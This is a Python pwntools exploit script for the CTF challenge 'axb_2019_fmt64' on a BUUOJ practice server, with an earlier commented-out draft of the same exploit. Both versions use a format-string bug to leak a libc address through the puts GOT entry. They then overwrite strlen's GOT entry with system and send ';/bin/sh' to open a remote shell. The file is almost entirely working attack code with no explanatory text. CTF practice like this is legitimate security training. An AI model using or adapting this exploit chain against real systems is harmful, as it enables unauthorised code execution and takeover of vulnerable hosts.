#!/usr/bin/env python3

# from pwn import *
from LibcSearcher import *

# context(os = 'linux',arch = 'amd64',log_level = 'debug')

# file_name = './axb_2019_fmt64'
# lib_name = '/home/ra4ing/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6'
# debug = 0
# if debug:
#     p = process(file_name)
#     context.terminal = ['tmux','splitw','-h']
#     # gdb.attach(p)
# else:
#     ip = 'node5.buuoj.cn'
#     port = '27374'
#     p = remote(ip, port)
# elf = ELF(file_name)
# rop = ROP(file_name)
# libc = ELF(lib_name)

# puts_got = elf.got['puts']
# strlen_got = elf.got['strlen']
# payload = b'%9$s' + b'AAAA' + p64(puts_got)

# p.recvuntil(b'Please tell me:')
# p.send(payload)
# p.recvuntil(b':')
# printf_addr = u64(p.recv(6).ljust(8, b'\x00'))
# success(hex(printf_addr))

# libc_base = printf_addr - libc.sym['puts']
# system_addr = libc_base + libc.sym['system']
# high_sys = (system_addr >> 16) & 0xff
# low_sys = (system_addr) & 0xffff

# payload = b'%' + bytes(str(high_sys - 9), 'utf-8') + b'c%12$hhn' + b'%' + bytes(str(low_sys - high_sys), 'utf-8') + b'c%13$hhn'
# payload = payload.ljust(32, b'A') + p64(strlen_got + 2) + p64(strlen_got)
# p.recvuntil(b'Please tell me:')
# p.sendline(payload)
# p.sendline(b';/bin/sh\x00')

# p.interactive()
# p.close()

from pwn import * 

context.log_level='debug'

# io = process('./axb_2019_fmt64')
io = remote("node5.buuoj.cn",29142)
elf = ELF("./axb_2019_fmt64")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
puts_got = elf.got["puts"]
sprintf_got = elf.got["sprintf"]
strlen_got = elf.got["strlen"]
print (hex(puts_got))

#payload1 = p64(puts_got)+"%08$s" 
payload1 = b"%9$s" + b"AAAA" + p64(puts_got)
io.sendafter("Please tell me:",payload1)
print(io.recvuntil("Repeater:"))
puts_addr = u64(io.recv(6).ljust(8,b"\x00"))
print("puts_addr ---> ",hex(puts_addr))

libcbase = puts_addr - libc.sym["puts"]
system_addr = libcbase + libc.sym["system"]
print("system_addr ---> ", hex(system_addr))

high_sys = (system_addr >> 16) & 0xff
low_sys = system_addr & 0xffff

payload2 = ("%" + str(high_sys - 9) + "c%12$hhn" + "%" + str(low_sys - high_sys) + "c%13$hn").encode()
payload2 = payload2.ljust(32,b"A") + p64(strlen_got + 2) + p64(strlen_got)
payload2 += b'BBBB'

io.sendafter("Please tell me:",payload2) 
io.recvuntil(b'BBBB')

payload3 = b';/bin/sh\x00'
io.send(payload3)

io.interactive()
io.close()
